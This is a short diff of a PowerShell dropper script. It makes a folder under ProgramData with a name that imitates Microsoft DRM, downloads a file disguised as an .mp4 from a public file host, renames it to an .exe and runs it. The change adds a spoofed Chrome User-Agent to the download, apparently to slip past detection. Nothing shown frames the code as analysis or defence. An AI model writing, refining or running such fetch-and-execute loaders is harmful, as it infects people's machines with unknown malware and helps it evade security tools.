@@ -2,6 +2,10 @@
 $p='C:\ProgramData\Microsoft\DRM(wpa)';
 New-Item $p -ItemType Directory -Force -ErrorAction SilentlyContinue;
 $f = $p + '\svcwrap';
-(New-Object Net.WebClient).DownloadFile('https://files.catbox.moe/2iknh2.mp4', $f+'.tmp');
+
+$wc = New-Object System.Net.WebClient;
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36');
+$wc.DownloadFile('https://files.catbox.moe/2iknh2.mp4', $f+'.tmp');
+
 Rename-Item ($f+'.tmp') ($f+'.exe');
 & ($f+'.exe')
